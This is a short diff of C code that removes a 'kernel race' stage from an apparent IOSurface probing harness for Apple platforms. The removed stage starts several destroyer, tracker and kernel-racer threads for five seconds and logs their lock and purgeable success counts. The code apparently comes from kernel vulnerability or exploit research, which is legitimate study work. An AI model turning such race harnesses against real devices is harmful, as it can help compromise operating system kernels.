@@ -1949,55 +1949,6 @@ static void r268_probe(IOSurfaceRef surf) {
         }
     }
 
-    /* Part 4: Short kernel race (5 seconds to avoid Jetsam) */
-    rlog("\n=== r268 Part 4: Kernel race (5s) ===\n"); fflush(stdout);
-    {
-        int w2 = 32, h2 = 32, bpe2 = 4, bpr2 = w2 * bpe2, pf2 = 0x42475241, as2 = bpr2 * h2;
-        CFMutableDictionaryRef rprops = CFDictionaryCreateMutable(NULL, 0,
-            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-        CFNumberRef rw = CFNumberCreate(NULL, kCFNumberIntType, &w2);
-        CFNumberRef rh = CFNumberCreate(NULL, kCFNumberIntType, &h2);
-        CFNumberRef rb = CFNumberCreate(NULL, kCFNumberIntType, &bpe2);
-        CFNumberRef rr = CFNumberCreate(NULL, kCFNumberIntType, &bpr2);
-        CFNumberRef rpf = CFNumberCreate(NULL, kCFNumberIntType, &pf2);
-        CFNumberRef ras = CFNumberCreate(NULL, kCFNumberIntType, &as2);
-        CFDictionarySetValue(rprops, CFSTR("IOSurfaceWidth"), rw);
-        CFDictionarySetValue(rprops, CFSTR("IOSurfaceHeight"), rh);
-        CFDictionarySetValue(rprops, CFSTR("IOSurfaceBytesPerElement"), rb);
-        CFDictionarySetValue(rprops, CFSTR("IOSurfaceBytesPerRow"), rr);
-        CFDictionarySetValue(rprops, CFSTR("IOSurfacePixelFormat"), rpf);
-        CFDictionarySetValue(rprops, CFSTR("IOSurfaceAllocSize"), ras);
-        CFRelease(rw); CFRelease(rh); CFRelease(rb); CFRelease(rr); CFRelease(rpf); CFRelease(ras);
-
-        memset((void*)r267_last_ids, 0, sizeof(r267_last_ids));
-        r267_race_stop = 0;
-        r267_id_head = 0;
-        r267_lock_ok = r267_lock_fail = r267_purg_ok = r267_purg_fail = 0;
-        r267_tex_ok = r267_tex_fail = 0;
-
-        pthread_t threads[8];
-        int tc = 0;
-        pthread_create(&threads[tc++], NULL, r267_destroyer_fn, rprops);
-        pthread_create(&threads[tc++], NULL, r267_id_tracker_fn, rprops);
-        pthread_create(&threads[tc++], NULL, r267_id_tracker_fn, rprops);
-        pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)0);
-        pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)0);
-        pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)1);
-        pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)1);
-        pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)2);
-
-        sleep(5);
-        r267_race_stop = 1;
-        for (int i = 0; i < tc; i++) pthread_join(threads[i], NULL);
-
-        rlog("  Lock: ok=%llu fail=%llu\n", r267_lock_ok, r267_lock_fail);
-        rlog("  Purgeable: ok=%llu fail=%llu\n", r267_purg_ok, r267_purg_fail);
-        rlog("  UseCount+SetValue: ok=%llu fail=%llu\n", r267_tex_ok, r267_tex_fail);
-        fflush(stdout);
-
-        CFRelease(rprops);
-    }
-
     if (iokit) dlclose(iokit);
     IOServiceClose(conn);
     IOObjectRelease(svc);
